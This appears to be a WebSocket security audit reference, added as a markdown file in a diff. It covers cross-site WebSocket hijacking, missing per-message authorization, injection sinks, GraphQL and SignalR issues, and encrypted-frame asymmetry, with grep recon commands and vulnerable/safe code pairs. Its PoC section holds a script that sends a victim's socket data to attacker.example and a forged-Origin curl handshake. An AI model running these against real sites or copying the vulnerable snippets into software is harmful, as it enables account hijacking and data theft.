@@ -1,0 +1,330 @@
+---
+name: websocket_security
+version: "0.2"
+description: WebSocket security — CSWSH, missing authz, message injection, and encrypted-channel frame-type auth asymmetry (Binary MAC'd / Text plaintext bypass)
+---
+
+# WebSocket Security (CSWSH / Missing Auth / Message Injection) (CWE-345, CWE-284, CWE-346)
+
+The WebSocket handshake is an HTTP upgrade that browsers send **with the user's cookies** but **without** the same-origin restrictions that apply to `fetch`/XHR (there is no CORS preflight for `ws://`/`wss://`). A server that does not validate the `Origin` header on the upgrade — and relies on the ambient session cookie for auth — can be connected to from any attacker page on behalf of the logged-in victim. Beyond that handshake flaw, WS endpoints frequently skip authentication entirely and echo/broadcast message payloads without sanitization.
+
+## What It Is / Is Not
+
+- **Is**:
+  1. **CSWSH** — upgrade handler accepts connections without checking `Origin` against an allowlist while authenticating via cookies (cross-site, cookie-driven).
+  2. **Missing auth/authz** — WS handler processes messages without verifying a session/JWT, or enforces authz only at handshake and not per message.
+  3. **Message injection** — `event.data` broadcast/echoed into other clients' DOM (stored DOM XSS) or into a server-side sink (SQL, command, XML, SSRF, file path) without sanitization.
+  4. **Encrypted-channel frame-type auth asymmetry** — session advertises E2E/secretbox encryption but only some opcodes (e.g. Binary) run `key.dec`/MAC while Text (or other) frames are returned as raw bytes → on-path/relay forges protocol messages inside an "encrypted" session.
+- **Is not**: CSRF on a normal HTTP endpoint (`csrf.md` — but CSWSH is the WS analogue), CORS misconfiguration on `fetch` (`cors_misconfiguration.md`), or `ws://` cleartext transport alone (`cleartext_transmission.md`, cross-ref). When the only issue is `ws://` carrying tokens, report cleartext; when origin/auth is missing, report here. CSWSH/`maxPayload` coverage does **not** discharge frame-crypto asymmetry.
+
+## Source -> Sink Pattern
+
+- **CSWSH source**: cross-origin attacker page opens `new WebSocket('wss://victim/...')`; the browser attaches victim cookies. **Sink**: server upgrade handler that authorizes purely on the cookie session with no `Origin` allowlist check.
+- **Message-injection source**: `event.data` / received frame from `ws.on('message')` / `onmessage`. **Sinks**:
+  - **DOM broadcast** → `innerHTML`, template literals in UI (XSS — `xss.md`)
+  - **SQL** → string-built query from parsed JSON field (`sql_injection.md`)
+  - **OS command** → `exec`/`spawn`/`subprocess` with message payload (`rce.md`)
+  - **XML parse** → `parseString`, `DocumentBuilder` on message body (`xxe.md`)
+  - **Outbound fetch** → server-side HTTP client URL from message field (`ssrf.md`)
+  - **File path** → `readFile`, `open()` with user path from message (`path_traversal_lfi_rfi.md`)
+
+## Recon Indicators (Grep)
+
+```bash
+# Node ws / Socket.IO servers — check for an Origin/verifyClient guard nearby
+rg -n "new WebSocket\.Server|WebSocketServer\s*\(|require\(['\"]ws['\"]\)|socket\.io" --glob '*.{js,ts}'
+rg -n "verifyClient|handleProtocols|checkOrigin|origin" --glob '*.{js,ts}'
+# Go gorilla/coder — Upgrader with no CheckOrigin, or CheckOrigin returning true unconditionally
+rg -n "websocket\.Upgrader\{" -A4 --glob '*.go'
+rg -n "CheckOrigin:\s*func\([^)]*\)\s*bool\s*\{\s*return\s+true" --glob '*.go'
+# Python (websockets / starlette / channels / aiohttp) handlers
+rg -n "websocket\.accept|async def .*\bwebsocket\b|@websocket_route|WebsocketConsumer" --glob '*.py'
+# Java/Spring — endpoint config; check for setAllowedOrigins("*")
+rg -n "@ServerEndpoint|registerWebSocketHandlers|setAllowedOrigins" --glob '*.java'
+# Broadcast of raw message (XSS via WS) and missing per-message auth
+rg -n "clients\.forEach|broadcast|\.emit\(|\.send\(\s*(message|data|msg)\b" --glob '*.{js,ts}'
+# Per-message injection sinks — message payload → server-side dangerous API
+rg -n "on\s*\(['\"]message['\"]|onmessage\s*=" --glob '*.{js,ts,py,go,java}' -A6
+rg -n "ws\.on\(['\"]message|websocket\.receive|async def .*\bwebsocket\b" --glob '*.{js,ts,py}' -A5 | rg -n "execute|query\(|exec\(|spawn|fetch\(|requests\.|readFile|open\(|parse\("
+# Missing frame/message size limits (memory-exhaustion DoS)
+rg -n "maxPayload|maxMessageSize|max_size|maxFrameSize|setMaxTextMessageBufferSize" --glob '*.{js,ts,py,go,java}'
+rg -n "new WebSocket\.Server\s*\(\s*\{|WebSocketServer\s*\(\s*\{" --glob '*.{js,ts}' -A3
+# GraphQL subscription transports without auth
+rg -n "graphql-ws|graphql_transport_ws|useServer|subscriptions-transport-ws|/subscriptions" --glob '*.{js,ts}'
+```
+
+## Vulnerable Conditions
+
+- Upgrade accepted with **no `Origin` allowlist** while the connection is authorized by an ambient cookie session → **CSWSH** (attacker reads/acts on victim's socket).
+- Go `websocket.Upgrader{}` with default `CheckOrigin` (returns true for same-host only in older versions; explicit `return true` disables the check entirely) on a cookie-authenticated endpoint.
+- Spring `setAllowedOrigins("*")` (or SockJS allowed-origins `*`) on an authenticated handler.
+- WS handler that never verifies identity (`ws.on('message', ...)` acts on any connection), or checks auth once at connect but not on privileged messages.
+- Received `event.data` broadcast to other clients and rendered via `innerHTML` → stored DOM XSS affecting every connected user.
+- **No `maxPayload` / `maxMessageSize` / `max_size`** on the WebSocket server — attacker sends multi-megabyte frames → memory exhaustion (cross-ref `denial_of_service.md`).
+- **GraphQL subscription endpoint** (`/subscriptions`, `graphql-ws`, `graphql_transport_ws`) mounted without authentication — real-time schema access and resolver execution for anonymous clients.
+- Message handler passes `JSON.parse(data).query` / `.sql` / `.url` / `.path` into injection sinks (see per-message taxonomy below).
+
+## Per-Message Injection Sink Taxonomy
+
+Data from `ws.on('message')`, `socket.on('message')`, or framework `onmessage` handlers is **per-frame untrusted input**. Beyond DOM broadcast XSS, trace message fields into server sinks:
+
+| Sink class | Example pattern | Cross-ref |
+|------------|-----------------|-----------|
+| SQL | `db.query(\`SELECT * FROM t WHERE id=${msg.id}\`)` | `sql_injection.md` |
+| OS command | `exec(msg.cmd)` / `subprocess.run(msg['shell'])` | `rce.md` |
+| XML parse | `parseString(msg.body)` / `DocumentBuilder.parse(msg)` | `xxe.md` |
+| Outbound fetch | `fetch(msg.url)` / `axios.get(data.endpoint)` | `ssrf.md` |
+| File path | `fs.readFile(msg.path)` / `open(data.filename)` | `path_traversal_lfi_rfi.md` |
+| DOM broadcast | `el.innerHTML = msg.text` / `broadcast(msg)` rendered unsafely | `xss.md` |
+
+**VULN**:
+```js
+ws.on('message', (data) => {
+  const msg = JSON.parse(data);
+  db.query(`SELECT * FROM users WHERE name = '${msg.name}'`);  // SQL
+  exec(msg.command);                                            // RCE
+  fetch(msg.callbackUrl);                                       // SSRF
+});
+```
+
+**SAFE**: validate message schema; parameterized queries; static allowlisted URLs; encode before DOM render; reject unknown message types.
+
+## Handshake-Only Auth on Privileged Messages
+
+Auth verified once at WebSocket **upgrade** (cookie/session on HTTP 101) but **not re-checked per message** lets any established connection invoke privileged actions — role changes, kick/ban, admin broadcasts, subscription to other users' channels — even if the session expired or the socket was hijacked mid-session.
+
+**Vulnerable conditions**:
+- `onConnect` reads session; `on('message')` handles `{ action: 'promoteUser', role: 'admin' }` with no principal re-validation
+- Chat/moderation WS: `kick`, `ban`, `deleteMessage` processed without checking sender role on each frame
+- Token validated at handshake only; long-lived socket outlives token TTL
+
+**Grep seeds**:
+```bash
+rg -n "on\s*\(['\"]connection['\"]|onConnect|afterConnect" --glob '*.{js,ts}' -A8
+rg -n "kick|ban|promote|role|admin|privilege" --glob '*.{js,ts,py}' -B5 | rg -n "message|on\('message"
+```
+
+**VULN**:
+```js
+wss.on('connection', (ws, req) => {
+  const user = sessionFromCookie(req);           // auth once at upgrade
+  ws.on('message', (raw) => {
+    const { action, targetId } = JSON.parse(raw);
+    if (action === 'kick') kickUser(targetId);   // no role check per message
+  });
+});
+```
+
+**SAFE**: bind socket to authenticated principal; re-validate token/session or role on every privileged action; close socket when session expires.
+
+## Naive Origin Allowlist (Substring Match)
+
+CSWSH mitigations fail when the upgrade handler checks `Origin` with **substring/prefix/suffix match** instead of an exact allowlist entry. Attackers register or control a host whose name **contains** the trusted string (`attacker.example.com` passes `origin.includes('example.com')`; `https://evil.example.com.attacker.net` passes `endsWith('.example.com')`).
+
+**Vulnerable conditions**:
+- `origin.includes('example.com')`, `origin.indexOf('example.com') !== -1`, `origin.endsWith('.example.com')` without parsing to `scheme://host` and comparing to a fixed set
+- Allowlist built from partial host suffixes or subdomain wildcards implemented via string search
+
+**Grep seeds**:
+```bash
+rg -n "origin\.(includes|indexOf|endsWith|startsWith|match)\(" --glob '*.{js,ts,py,go,java}'
+rg -n "CheckOrigin|verifyClient|allowedOrigins" --glob '*.{js,ts,go,java}' -A3 | rg -n "includes|indexOf|endsWith|startsWith|\*"
+```
+
+**VULN**:
+```js
+const origin = req.headers.origin || '';
+if (origin.includes('example.com')) upgrade.accept();  // bypass: https://attacker.example.com.evil.net
+```
+
+**SAFE**: parse `Origin` to `(scheme, host)`; require exact match against a fixed allowlist (`https://app.example.com`); reject missing, malformed, or non-HTTPS origins when cookies authorize the socket. In particular **reject `Origin: null`** — a sandboxed iframe, `data:`/`file:` document, or some redirect chains send `Origin: null`, and an allowlist that contains `"null"` (or treats falsy/`"null"` as same-origin) is CSWSH-able from any attacker page. Recon: `rg -n "===\s*['\"]null['\"]|allowedOrigins.*null|origin\s*\|\|\s*['\"]" --glob '*.{js,ts,go,java}'`.
+
+## Guessable resource id in the upgrade URL / first message (no auth)
+
+Some WS endpoints "authenticate" by embedding a session/user/room identifier in the **upgrade path** (`/ws/<uuid>`, `/socket/<userId>`) or accept it in the **first frame**, with no token validation in the upgrade handler. If the id is guessable, enumerable, leaked (Referer, logs), or simply not bound to the caller's session, any client connects to another user's stream → IDOR over WebSocket. **Recon**: `rg -n "/ws/|/socket|/subscriptions|/realtime" --glob '*.{js,ts,py,java,go,conf}'` for routes with a path param, then confirm the upgrade/`onConnect`/first-message handler validates that the id belongs to the authenticated principal. **SAFE**: authenticate the upgrade with a credential the attacker can't replay (short-lived token), then authorize the requested resource against that identity — never trust an id from the URL/first message alone. Cross-ref `idor.md`.
+
+## WebSocket upgrade smuggling (tunnel via non-101 response)
+
+A reverse proxy that decides "this is a WebSocket upgrade" from `Upgrade: websocket` + a `101` heuristic — but does **not** validate the handshake (`Sec-WebSocket-Version`, `Sec-WebSocket-Key`, masking, and that the backend actually returned `101`) — can be tricked into leaving the TCP connection **open as a raw tunnel** when the backend rejects the handshake with another status (e.g. `426 Upgrade Required` for an invalid `Sec-WebSocket-Version: 1337`). The client then speaks raw HTTP/TLS to the backend through the proxy, bypassing the edge's routing/ACL/WAF (a WebSocket analogue of h2c smuggling). **Recon**: proxy WS config that forwards the upgrade without validating the response — `rg -n 'Upgrade.*websocket|proxy_http_version|Sec-WebSocket|map \$http_upgrade' --glob '*.{conf,nginx,vcl,yml,yaml}'`, `rg -n 'upgrade|websocket' --glob 'Caddyfile*'`. **SAFE**: the proxy must tunnel **only** after a valid `101 Switching Protocols` with a correct `Sec-WebSocket-Accept`, and close the connection on any other status; validate `Sec-WebSocket-Version: 13`. Cross-ref `smuggling_desync.md`, `reverse_proxy_access_bypass.md`.
+
+## GraphQL Subscription Endpoints Without Auth
+
+Real-time GraphQL over WebSocket (`graphql-ws`, `graphql_transport_ws`, legacy `subscriptions-transport-ws`) exposes **subscription resolvers** on paths such as `/graphql`, `/subscriptions`, or dedicated WS URLs. When `useServer` / `SubscriptionServer` starts without auth middleware, callers receive live data streams (notifications, balances, admin events) without credentials.
+
+**Vulnerable conditions**:
+- `useServer({ schema, onConnect: () => true })` or missing `onConnect` identity check
+- `/subscriptions` route with no JWT/session validation before `subscribe` execution
+- Subscription resolvers return cross-user data with no object-level authz
+
+**Grep seeds**:
+```bash
+rg -n "useServer|graphql-ws|graphql_transport_ws|SubscriptionServer|makeServer" --glob '*.{js,ts}'
+rg -n "onConnect|connectionParams|didConnect" --glob '*.{js,ts}' -A4
+```
+
+**VULN**:
+```js
+useServer({ schema, wsServer });  // no onConnect auth — anonymous subscriptions
+```
+
+**SAFE**: validate `connectionParams.authToken` in `onConnect`; reject unauthenticated upgrade; enforce authz in subscription resolvers (same as query resolvers).
+
+## GraphQL Transport Parity Bypass (HTTP vs WebSocket)
+
+Introspection, auth middleware, or validation rules disabled on the **HTTP** `/graphql` route may still be reachable over the **GraphQL WebSocket** transport (`graphql-ws`, `subscriptions-transport-ws`). Clients send operation documents in subscription frames — not only over POST — so HTTP-only blocks do not protect the WS path.
+
+**Vulnerable conditions**:
+- HTTP handler sets `introspection: false` / blocks `__schema`, but `useServer` / `SubscriptionServer` executes arbitrary `query`/`subscribe` payloads without the same rules
+- Auth middleware applied to Express/Fastify HTTP `/graphql` but omitted from WS `onConnect` / `connectionParams` validation
+- Rate limits or persisted-query allowlists enforced only on HTTP POST bodies
+
+**Grep seeds**:
+```bash
+rg -n "introspection:\s*false|disableIntrospection|NoSchemaIntrospection" --glob '*.{js,ts,py,java}'
+rg -n "useServer|SubscriptionServer|graphql-ws|subscriptions-transport-ws" --glob '*.{js,ts}' -A8
+rg -n "__schema|__type" --glob '*.{js,ts,py}' -B3 | rg -v "validation|block|disable"
+```
+
+**VULN** — introspection over WS while blocked on HTTP:
+```json
+{"type":"subscribe","id":"1","payload":{"query":"{ __schema { types { name } } }"}}
+```
+(Legacy `subscriptions-transport-ws` uses `"type":"start"` with the same `payload.query` shape.)
+
+**SAFE**: enforce introspection disable, authn/authz, depth/complexity limits, and operation allowlists at the **GraphQL engine** (validation rules / `execute` wrapper) so every transport shares one policy. Cross-ref `graphql_injection.md`.
+
+## GraphQL Subscriptions / WebSocket as CSRF-Bypassing State-Change Vector
+
+GraphQL subscriptions — and queries/mutations accepted on the same WebSocket transport (`graphql-ws`, `graphql_transport_ws`, legacy `subscriptions-transport-ws`) — can **mutate server state**, but the **WebSocket upgrade path does not pass through HTTP CSRF synchronizer tokens or SameSite POST restrictions**. CSRF defenses wired to HTML forms, JSON POST middleware, or `csrfPrevention` on the HTTP `/graphql` route are **invisible to WS frames**. If the server authenticates the upgrade with ambient cookies and `onConnect` omits an `Origin` allowlist check, a cross-origin page opens the socket and drives state-changing `mutation` payloads — CSWSH used as a **CSRF primitive** that bypasses HTTP-only anti-CSRF controls.
+
+Distinct from **GraphQL Transport Parity Bypass** (introspection/auth rules disabled on HTTP but reachable on WS) and generic **CSWSH** (cross-site socket hijack for read/exfil): this pattern is when HTTP mutations are CSRF-protected but the **same mutations succeed over WS without any CSRF token**.
+
+**Vulnerable conditions**:
+- HTTP `/graphql` POST requires CSRF token / custom header; `useServer` / `SubscriptionServer` accepts `mutation { deleteUser ... }` with cookie-only auth and no `Origin` validation in `onConnect`
+- `connectionParams` carries no auth token; identity inferred solely from upgrade cookies
+- Mutations sent in `graphql-ws` `subscribe` frames or legacy `"type":"start"` payloads without CSRF-equivalent gate
+
+**Grep seeds**:
+```bash
+rg -n "onConnect\s*:\s*(\(\)|\(\s*\)\s*=>|\(\s*ctx|\(\s*connectionParams)" --glob '*.{js,ts}' -A6 | rg -v "origin|Origin|reject|401|403"
+rg -n "useServer|SubscriptionServer" --glob '*.{js,ts}' -A10 | rg -n "mutation|execute|graphql"
+rg -n "connectionParams" --glob '*.{js,ts}' -B2 -A4
+rg -n "csrfPrevention|csrfProtection|ValidateAntiForgery" --glob '*.{js,ts}' -B3 -A5 | rg -n "graphql|useServer|ws"
+rg -n "onConnect|handleProtocols|verifyClient|CheckOrigin" --glob '*.{js,ts,go,java}' -A5
+```
+
+**VULN**:
+```js
+// VULN — CSRF on HTTP POST only; WS drives same mutation with victim cookies
+app.post('/graphql', csrfProtection, graphqlHttpHandler);
+useServer({
+  schema,
+  onConnect: () => true,  // no Origin check; cookie session from upgrade
+});
+// Attacker page: ws.send(JSON.stringify({
+//   type: 'subscribe', id: '1',
+//   payload: { query: 'mutation { deleteAccount { ok } }' }
+// }));
+```
+
+**SAFE**: validate `Origin` on the WebSocket upgrade (exact allowlist; reject missing/malformed); do not authenticate WS by ambient cookies alone — require a short-lived token in `connectionParams` validated in `onConnect`; apply the **same authorization** to mutations regardless of transport. Cross-ref `csrf.md`, `graphql_injection.md`.
+
+## ASP.NET Core SignalR Hub Security
+
+SignalR is .NET's real-time framework over WebSocket — and a **`Hub` subclass's public methods are remotely-invokable RPC by default**. There is no route attribute or `[HttpPost]` gate: any client that can reach the hub endpoint can call any public method unless authorization is explicitly applied.
+
+- **VULN — unauthenticated hub RPC**: a `class ChatHub : Hub` (or `Hub<T>`) with public methods and **no `[Authorize]`** on the class or methods, where `MapHub<ChatHub>("/chat")` is reached without auth middleware. Any anonymous client invokes the methods (the SignalR analog of missing function-level authz). Method arguments are **per-call untrusted input** — trace them to sinks exactly like `ws.on('message')` (SQL/command/path/SSRF/`Process.Start` — `ChatHub` calling `Process.Start(...+message)` is the canonical example).
+- **VULN — over-broad / client-targeted broadcast**: `Clients.All.SendAsync(...)` pushing per-user/sensitive data to every connected client (info disclosure); `Clients.Group(clientSuppliedName)` / `Clients.User(clientSuppliedId)` / `Groups.AddToGroupAsync(ctx.ConnectionId, clientSuppliedGroup)` where the target group/user comes from client input → cross-tenant message delivery / channel IDOR (cross-ref `idor.md`).
+- **SAFE**: `[Authorize]` on the hub (and `[Authorize(Policy=...)]`/role checks per sensitive method); derive the caller identity from `Context.User`, never trust a client-supplied user/group id; validate+authorize group membership server-side; treat every hub-method parameter as untrusted and apply the same sink defenses as any HTTP handler. **Grep seeds**: `:\s*Hub\b`, `:\s*Hub<`, `Clients\.All`, `Clients\.(Group|User|Client)\(`, `Groups\.AddToGroupAsync\(`, `MapHub<`, `AddSignalR\(` — then check for `[Authorize]` on the hub and whether targets/args are client-controlled.
+
+## Encrypted session: Text vs Binary frame auth asymmetry
+
+When the app layers **application encryption** (secretbox / NaCl / custom MAC) on top of WebSocket, every frame that carries protocol messages must go through the same authenticate-decrypt path. A common bug: `Binary` frames call `key.dec()` / verify-MAC, but `Text` frames (or ping/control misuse) return **raw payload bytes** with no crypto.
+
+- **VULN**: `next()` / `on_message` branches `if Binary { key.dec(payload) } else if Text { return payload }` (or equivalent) while the session is marked secured/encrypted; callers then parse protobuf/JSON actions (input, clipboard, file, permissions) from unauthenticated bytes. On-path attacker, malicious relay, or peer injects forged messages via Text frames. **Do not CLOSE** because Origin/CSWSH or `maxPayload` is correct — those are different classes. Cross-ref `cleartext_transmission.md` when the sibling bug is dropping the session key entirely (`set_raw` / `secure=false`).
+- **SAFE**: reject non-Binary (or non-expected) opcodes on the encrypted channel; or route **all** data-bearing opcodes through `key.dec`/MAC before parse; never treat Text as a plaintext escape hatch inside an encrypted session.
+- Grep: `rg -n "Message::Text|Opcode::Text|is_text\(|Frame::text|Binary.*dec|secretbox|key\.dec" --glob '*.{rs,go,ts,js,py}'` then confirm Text/other paths authenticate identically.
+
+## Missing Max Frame / Message Size (DoS)
+
+WebSocket libraries default to large or unlimited frame buffers. Without **`maxPayload`** (`ws`), **`maxMessageSize`** / **`max_size`** (Python `websockets`), or **`setMaxTextMessageBufferSize`** (Java), a single oversized text/binary frame can exhaust server memory.
+
+**Vulnerable conditions**:
+- `new WebSocket.Server({ port })` with no `maxPayload` option
+- `websockets.serve()` / Starlette `WebSocket` with no inbound size cap
+- Spring `WebSocketHandler` with default unlimited text buffer
+
+**Grep seeds**:
+```bash
+rg -n "WebSocket\.Server\s*\(|WebSocketServer\s*\(" --glob '*.{js,ts}' -A5 | rg -v "maxPayload"
+rg -n "maxPayload|maxMessageSize|max_size" --glob '*.{js,ts,py,java}'
+```
+
+**VULN**:
+```js
+const wss = new WebSocket.Server({ server });  // default maxPayload ~100MB — no explicit cap
+```
+
+**SAFE**: `maxPayload: 64 * 1024` (or stricter); reject oversize frames; rate-limit message frequency. Cross-ref `denial_of_service.md`.
+
+## Safe Patterns
+
+- **Validate `Origin`** on the handshake against a strict allowlist (exact scheme+host; reject missing/unknown Origin). Go: implement `CheckOrigin`; `ws`: use `verifyClient`/check `info.origin`; Spring: `setAllowedOrigins("https://app.example.com")` (never `*`).
+- **Authenticate the connection** with a token that is **not** an ambient cookie — e.g., a short-lived ticket/JWT passed in the first message or `Sec-WebSocket-Protocol`, validated server-side; bind the socket to the authenticated principal.
+- **Authorize every message**, not only the handshake (subscribe/publish/command checks per frame against the bound principal).
+- **Encode message payloads** before rendering; treat `event.data` as untrusted (route through the appropriate injection sanitizer).
+- Use `wss://` only (cross-ref `cleartext_transmission.md`).
+
+## Severity / Triage
+
+- CSWSH on a cookie-authenticated socket exposing sensitive data or actions → **High** (cross-site account access without user interaction beyond visiting a page).
+- Missing authentication on a privileged WS endpoint → **High**.
+- Per-message authz missing (handshake-only) on sensitive operations → **High/Medium**.
+- Privileged WS actions (`kick`, `ban`, role change) without per-message role check → **High**.
+- GraphQL subscriptions without `onConnect` auth → **High** (live data exfiltration).
+- GraphQL WS mutations bypassing HTTP CSRF controls (cookie auth, no Origin) → **High** (cross-site state change without CSRF token).
+- Message payload → SQL/command/SSRF/XML/file sink → severity per sink reference.
+- No `maxPayload` / message size limit → **Medium** DoS (cross-ref `denial_of_service.md`).
+- Broadcast XSS via WS → severity per `xss.md` (stored DOM XSS → High).
+- Encrypted-channel Text/Binary auth asymmetry → **High** (in-session auth bypass / control forgery).
+- `Origin` checked / token-based (non-cookie) auth present → **FALSE POSITIVE** for CSWSH (not for frame-crypto asymmetry).
+
+## Dynamic Test / PoC
+
+```html
+<!-- CSWSH: host on attacker origin, lure the logged-in victim to visit -->
+<script>
+  const ws = new WebSocket('wss://victim.example/ws');         // victim cookies auto-attached
+  ws.onmessage = e => fetch('https://attacker.example/x?d=' + encodeURIComponent(e.data));
+  ws.onopen   = () => ws.send(JSON.stringify({action: 'getAccountData'}));
+</script>
+```
+```bash
+# Handshake without/with forged Origin — success on a cookie-auth socket => CSWSH
+curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
+  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom|base64)" \
+  -H "Origin: https://attacker.example" -H "Cookie: session=<victim>" \
+  https://victim.example/ws
+```
+Confirmed when the cross-origin connection succeeds (HTTP 101) and returns the victim's data.
+
+## Common False Alarms
+
+- Public, unauthenticated broadcast sockets carrying no per-user data and no privileged actions (origin check not security-relevant).
+- Endpoints authenticated by a non-cookie bearer token validated in the first frame (CSWSH not applicable — attacker page cannot obtain the token).
+- `Origin`/allowlist enforced at a reverse proxy/API gateway in front of the app (verify it exists before closing).
+
+## Cross-References
+
+- `csrf.md` — CSWSH is the WebSocket analogue of CSRF; cookie-driven, cross-site; GraphQL WS mutations bypass HTTP CSRF tokens.
+- `cors_misconfiguration.md` — analogous origin-trust failure for `fetch`/XHR.
+- `cleartext_transmission.md` — `ws://` carrying tokens.
+- `xss.md` — message broadcast rendered into the DOM.
+- `sql_injection.md` / `rce.md` / `ssrf.md` / `xxe.md` / `path_traversal_lfi_rfi.md` — per-message server-side sinks.
+- `denial_of_service.md` — oversized frames / unbounded message buffers.
+- `graphql_injection.md` — unauthenticated GraphQL subscription transports; introspection/authz parity across HTTP and WS; CSRF-bypassing mutations over WS transport.
+- `idor.md` / `race_conditions.md` — per-message authorization and concurrency on WS streams.
+
+## Core Principle
+
+Treat the WebSocket handshake as an authentication boundary: validate `Origin` against an allowlist, authenticate with a credential the attacker's page cannot replay (not an ambient cookie alone), authorize every message, and encode all payloads.
